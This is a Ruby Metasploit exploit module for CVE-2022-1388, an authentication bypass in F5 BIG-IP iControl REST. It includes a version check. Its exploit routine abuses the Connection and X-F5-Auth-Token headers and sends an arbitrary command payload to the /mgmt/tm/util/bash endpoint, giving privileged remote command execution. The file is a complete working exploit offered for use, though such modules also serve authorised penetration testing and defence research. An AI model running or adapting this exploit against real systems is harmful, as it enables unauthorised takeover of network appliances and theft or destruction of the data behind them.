##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Undisclosed requests may bypass iControl REST authentication',
        'Description' => %q{
          On F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1,
          14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x
          and 11.6.x versions, undisclosed requests may bypass iControl REST authentication.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Heyder Andrade' # Metasploit module
        ],
        'References' => [
          ['CVE', '2022-1388'],
          ['URL', 'https://support.f5.com/csp/article/K23605346']
        ],
        'Platform' => ['unix'],
        'Arch' => ARCH_CMD,
        'Targets' => [
          ['F5 iControl', { 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/generic' } }]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-05-05',
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the iControl installation', '/']),
        OptString.new('Authorization', [true, 'Username and Password to be sent in the Authorization header', 'admin:'])
      ]
    )
  end

  def check
    print_status("Checking component version to #{datastore['RHOST']}:#{datastore['RPORT']}")
    res = send_request_cgi({
      'uri' => normalize_uri('/mgmt/shared/authn/login'),
      'method' => 'GET'
    })

    return CheckCode::Unknown unless res

    body = JSON(res.body) if res && res.code == 401

    Exploit::CheckCode::Appears if body.key?('message') && body['kind'] == ':resterrorresponse'
  end

  def exploit
    res = send_request_cgi({
      'uri' => normalize_uri('/mgmt/tm/util/bash'),
      'version' => '1.1',
      'method' => 'POST',
      'headers' => {
        'Authorization' => "Basic  #{Base64.strict_encode64(datastore['Authorization'])}",
        'Connection' => 'keep-alive, X-F5-Auth-Token',
        'X-F5-Auth-Token' => 0,
        'Keep-Alive' => '300',
        'Cache-Control' => 'max-age=0',
        'Content-Type' => 'application/json'
      },
      'data' => { command: 'run', utilCmdArgs: " -c '#{payload.encoded}' " }.to_json
    })
    fail_with(Failure::UnexpectedReply) unless res.code == 200
    print_good JSON(res.body)['commandResult']
  end
end
